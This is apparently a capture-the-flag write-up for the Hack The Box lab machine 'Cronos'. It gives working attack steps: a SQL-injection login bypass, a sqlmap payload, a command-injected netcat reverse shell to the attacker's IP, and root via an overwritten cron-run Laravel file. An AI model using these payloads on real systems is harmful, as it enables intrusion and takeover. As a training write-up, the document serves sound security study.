# Cronos

## Enumeration

We start with a routine nmap: `$ nmap -vvv -sCV -oN nmap 10.10.10.13`.

```bash
# Nmap 7.80 scan initiated Sun Mar 29 07:22:50 2020 as: nmap -vvv -sCV -oN nmap 10.10.10.13
Nmap scan report for 10.10.10.13
Host is up, received syn-ack (0.056s latency).
Scanned at 2020-03-29 07:22:50 CDT for 21s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|:-::::::::::::::
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
| 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
| 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
| _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 29 07:23:11 2020 -- 1 IP address (1 host up) scanned in 21.48 seconds
```

Ports 22, 53 and 80 are open. 22 is running `ssh`, 53 is the DNS port, and 80 is a webserver running `Apache httpd 2.4.18`, and we know the OS is `Ubuntu`.

Let's crawl that webserver and see what other pages there are. Nothing comes up with `$ gobuster dir -u http://10.10.10.13 -w ~/wordlists/common.txt -o gobuster-common-http-root.log --wildcard -t 20
` sweep, so we'll have to try something else.

The `SSH` version is fairly recent so we're going to skip that for now, and move on to `DNS` enumeration.

### DNS

`DNS` is running on `TCP` instead of `UDP`, which indicates that it may be vulnerable to a `DNS` Zone Transfer Attack. Let's grab the nameserver address...

```bash
nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

Great, so the nameserver is `ns1.cronos.htb.`

So I'm going to edit my `/etc/hosts` file to redirect `cronos.htb` to `10.10.10.13`. The syntax for this is: `10.10.10.13       cronos.htb`.

Now, when I navigate to `http://cronos.htb`, I see a real webpage.

Let's try a DNS zone transfer.

```bash
$ dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.11.16-2-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 51 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon Mar 30 07:07:20 CDT 2020
;; XFR size: 7 records (messages 1, bytes 203)
```

We'll now edit our `/etc/hosts` file again to include the new domains we've found: `admin.cronos.htb`, `ns1.cronos.htb`, and `www.cronos.htb`. The line in the file now looks like this: `10.10.10.13       cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb`.

Navigating to all of those in our web browser gives us:

| URL               | Result                                 |
| ---               | ---                                    |
| cronos.htb        | Regular cronos homepage                |
| ns1.cronos.htb    | Default Apache2 successful setup page  |
| www.cronos.htb    | Regular cronos homepage                |
| admin.cronos.htb  | **LOGIN PANEL!**                       |

Great, so we found a login panel! Let's try to run `sqlmap` on it to see if it's vulnerable to SQL injection. To do this, we're going to intercept a login request with Burp Suite (with `admin` for the username and a blank password), save it as a file and then pass it to `sqlmap` like so: `$ sqlmap -r login.req`.

```bash
$ sqlmap -r login.req
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.3#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:56:17 /2020-03-30/

[10:56:17] [INFO] parsing HTTP request from 'login.req'
[10:56:17] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:56:17] [INFO] testing connection to the target URL
[10:56:17] [INFO] testing if the target URL content is stable
[10:56:17] [INFO] target URL content is stable
[10:56:17] [INFO] testing if POST parameter 'username' is dynamic
[10:56:18] [WARNING] POST parameter 'username' does not appear to be dynamic
[10:56:18] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[10:56:18] [INFO] testing for SQL injection on POST parameter 'username'
[10:56:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:56:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:56:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:56:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:56:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:56:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:56:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:56:20] [INFO] testing 'Generic inline queries'
[10:56:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:56:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:56:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:56:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:56:31] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[10:56:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:56:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://admin.cronos.htb:80/welcome.php'. Do you want to follow? [Y/n]
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N]
[10:56:40] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4971 FROM (SELECT(SLEEP(5)))Edsz) AND 'MTmR'='MTmR&password=
---
[10:57:00] [INFO] the back-end DBMS is MySQL
[10:57:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[10:57:00] [INFO] fetched data logged to text files under '/home/alichtman/.sqlmap/output/admin.cronos.htb'

[*] ending @ 10:57:00 /2020-03-30/
```

So it looks like the username field is vulnerable to SQL injection. We can revisit the admin page and log in with an SQL injection. Putting `admin' or ''='` in the username field and hitting submit bypasses the login page.

We're now faced with a simple webpage with the heading "WebTool v0.1". It has a simple selector where you can run `ping` or `traceroute` commands. You can trivially gain command execution by changing the input to `;COMMAND` and hitting run. We can test this out with `;whoami` and seeing `www-data` as the output on the webpage. Let's see if we can pop a shell on this box!

## Reverse Shell

First, I run `$ nc -lvnp 8081` to start a listener on port `8081`.

Putting `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.31 8081 >/tmp/f` in the command box and hitting execute spawns a reverse shell that reaches out to my listener.

```bash
$ nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.13] 42892
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Upgrading Shell

To get a full tty, I run: 

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$
```
I also want full signal handling and tab-completion, so I background the reverse shell with Ctrl-Z and run the following commands to get some info about my terminal:

```bash
$ stty -a
speed 38400 baud; rows 26; columns 104; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>;
start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel
-iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho
-extproc

$ echo $TERM
xterm-256color

$ stty raw -echo; fg # Bring the reverse shell back to foreground
$ export SHELL=bash
$ export TERM=xterm-256color # Same as on my OS
$ stty rows 26 columns 104   # From stty -a output
```

This process always created an unstable shell on Cronos, so I skipped this step and soldiered on.

## User Flag

Once we have a shell, getting the user flag is easy.

```bash
$ ls /home
ls /home
noulis
$ cd /home/noulis
cd /home/noulis
$ wc user.txt
wc user.txt
 1  1 33 user.txt
$ cat user.txt
cat user.txt
51d236438b333970dbba7dc3089be33b
```

## Privilege Escalation

I run a server on my Kali box in a directory with enumeration scripts to be copied over:

```bash
$ htb_ip () {
        ifconfig tun0 | awk '/inet / {print $2}'
}
$ htb_server () {
        echo "Server IP Address copied to clipboard" && echo "$(htb_ip):8000/" | xsel -ib && python3 -m http.server
}
$ htb_server
```

On the webshell, I run `$ curl http://10.10.14.31:8000/LinEnum.sh > LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh` to kick off the priv esc.

```bash
$ ./LinEnum.sh
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Mon Mar 30 21:32:14 EEST 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
...
...
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
...
...
```

That last line in the crontab looks a little suspicious. It runs as the root user, but the project it's running may not be set with root permissions required to edit. Pulling up the [Laravel artisan docs](https://laravel.com/docs/5.8/scheduling#defining-schedules) to learn more, I found out that the scheduling tasks are defined in `App/Console/Kernel.php`.

Opening that file in `vim` shows me this commented out schedule function. I have write permissions for this file, so I can add my own scheduling function.

```php
<?php

namespace App\Console;

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;

class Kernel extends ConsoleKernel
{
    ...
    ...
    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        // $schedule->command('inspire')
        //          ->hourly();
    }
    ... 
    ... 
}
```

I replaced this scheduling function with my own:

```php
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('touch /tmp/flag.txt && cat /root/flag.txt > /tmp/flag.txt')
                  ->everyMinute();
    }
```

And waited for the cronjob to run. A file was created at `/tmp/flag.txt` by `root`, but it has a size of 0B. We'll have to try something else.

Let's try replacing the artisan binary with a reverse shell, since we have write permissions for the file (which can be checked by running `ls -l` in the `/var/www/laravel` directory)

```bash
www-data@cronos:/var/www/laravel$ ls -l
total 1996
-rw-r--r--  1 www-data www-data     727 Apr  9  2017 CHANGELOG.md
drwxr-xr-x  6 www-data www-data    4096 Apr  9  2017 app
-rwxr-xr-x  1 www-data www-data    1646 Apr  9  2017 artisan
drwxr-xr-x  3 www-data www-data    4096 Apr  9  2017 bootstrap
-rw-r--r--  1 www-data www-data    1300 Apr  9  2017 composer.json
-rw-r--r--  1 www-data www-data  121424 Apr  9  2017 composer.lock
-rwxr-xr-x  1 www-data www-data 1836198 Apr  9  2017 composer.phar
drwxr-xr-x  2 www-data www-data    4096 Apr  9  2017 config
drwxr-xr-x  5 www-data www-data    4096 Apr  9  2017 database
-rw-r--r--  1 www-data www-data    1062 Apr  9  2017 package.json
-rw-r--r--  1 www-data www-data    5491 Mar 31 12:06 php-reverse-shell.php
-rw-r--r--  1 www-data www-data    1055 Apr  9  2017 phpunit.xml
drwxr-xr-x  4 www-data www-data    4096 Apr  9  2017 public
-rw-r--r--  1 www-data www-data    3424 Apr  9  2017 readme.md
drwxr-xr-x  5 www-data www-data    4096 Apr  9  2017 resources
drwxr-xr-x  2 www-data www-data    4096 Apr  9  2017 routes
-rw-r--r--  1 www-data www-data     563 Apr  9  2017 server.php
drwxr-xr-x  5 www-data www-data    4096 Apr  9  2017 storage
drwxr-xr-x  4 www-data www-data    4096 Apr  9  2017 tests
drwxr-xr-x 31 www-data www-data    4096 Apr  9  2017 vendor
-rw-r--r--  1 www-data www-data     555 Apr  9  2017 webpack.mix.js
```

I move [this PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) from my host to Cronos using the same technique as before for moving `LinEnum.sh`. I then edit the config of the reverse shell to point at my host on a port I will set up a listener on. And then I move the reverse-shell to artisan after making it executable with `chmod +x php-reverse-shell.php`. And now we wait for the cronjob to run...

```bash
nc -lvnp 8082
listening on [any] 8082 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.13] 37208
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:13:02 up  2:42,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
www-data pts/1    tmux(3050).%0    11:55   17:33   0.02s  0.00s tmux
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
# ls /root/
root.txt
# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```

And there we have it.

I also now realize that my original approach to reading the root flag didn't work because I didn't have the correct path! I was using `/root/flag.txt`, not `/root/root.txt`.

I bet that if I reset the box (since I've overwritten the `artisan` file) and changed my scheduled function to cat the correct file that I would have been able to read the root flag a bit ago... On the other hand, this approach gets me a full **root shell**, not just the ability to execute commands with root privileges.

Another approach I could have taken was a kernel exploit since the kernel was so old, but that's less fun.

```bash
[-] Kernel information (continued):
Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
```

The `4.4` kernel seems to be vulnerable to a number of exploits:

```bash
$ searchsploit 4.4 kernel
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                 |  Path
                                                                                                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Escalation (Metasploit)                                          | exploits/linux/local/19933.rb
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)           | exploits/linux_x86/local/9542.c
Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption                                                                   | exploits/linux/dos/39545.txt
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                | exploits/linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                                             | exploits/linux/dos/46529.c
Linux Kernel 4.4 - 'rtnetlink' Stack Memory Disclosure                                                                                         | exploits/linux/local/46006.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                               | exploits/linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                                                                                           | exploits/linux/dos/41457.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                                                                            | exploits/linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation                                          | exploits/linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                 | exploits/linux/local/47170.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Escalation (1)                                               | exploits/linux/local/39277.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Escalation (2)                                               | exploits/linux/local/40003.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                   | exploits/linux/local/39772.txt
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation                                                                      | exploits/arm/local/31574.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                         | exploits/linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                              | exploits/linux/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                          | exploits/linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                      | exploits/linux/local/47169.c
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

_I've now confirmed that my original approach would have worked if I had the correct path of the root proof._
